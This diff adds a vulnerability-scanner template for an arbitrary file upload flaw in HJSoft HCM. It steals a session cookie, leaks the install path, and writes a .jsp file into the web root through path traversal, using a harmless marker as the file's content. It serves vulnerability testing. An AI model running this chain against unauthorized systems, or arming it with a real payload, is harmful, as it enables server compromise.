@@ -1,0 +1,127 @@
+id: poc-yaml-hjsoft-hcm-uploadlogo-anyfile-upload
+info:
+  name: HJSoft HCM uploadLogo Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - "{{BaseURL}}/module/system/qrcard/mobilewrite/qrcardmain.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "入职登记"
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        regex:
+          - "JSESSIONID=(.*?);"
+        internal: true
+
+  - id: step-2
+    method: POST
+    path:
+      - "{{BaseURL}}/sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1"
+    headers:
+      Cookie: "JSESSIONID={{cookie}}"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r"
+    body: |-
+      ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+      Content-Disposition: form-data; name="path"
+
+
+      ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+      Content-Disposition: form-data; name="lfType"
+
+      0
+      ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+      Content-Disposition: form-data; name="logofile"; filename=""
+      Content-Type: image/gif
+
+      bttest1
+      ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+      Content-Disposition: form-data; name="twoFile"; filename=""
+      Content-Type: image/gif
+
+      bttest1
+      ------WebKitFormBoundaryfjKBvGWJbG07Z02r--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"pathvalue\""
+    extractors:
+      - type: regex
+        name: paths
+        part: body
+        regex:
+          - "\\.value=\\\"(.*?)webapps"
+        internal: true
+
+  - id: step-3
+    method: POST
+    path:
+      - "{{BaseURL}}/sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1"
+    headers:
+      Cookie: "JSESSIONID={{cookie}}"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r"
+    body: |-
+      ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+      Content-Disposition: form-data; name="path"
+
+      {{paths}}webapps~5cROOT~5c{{t1}}.jsp
+      ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+      Content-Disposition: form-data; name="lfType"
+
+      0
+      ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+      Content-Disposition: form-data; name="logofile"; filename=""
+      Content-Type: image/gif
+
+      {{t2}}
+      ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+      Content-Disposition: form-data; name="twoFile"; filename=""
+      Content-Type: image/gif
+
+      {{t2}}
+      ------WebKitFormBoundaryfjKBvGWJbG07Z02r--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"pathvalue\""
+
+  - id: step-4
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
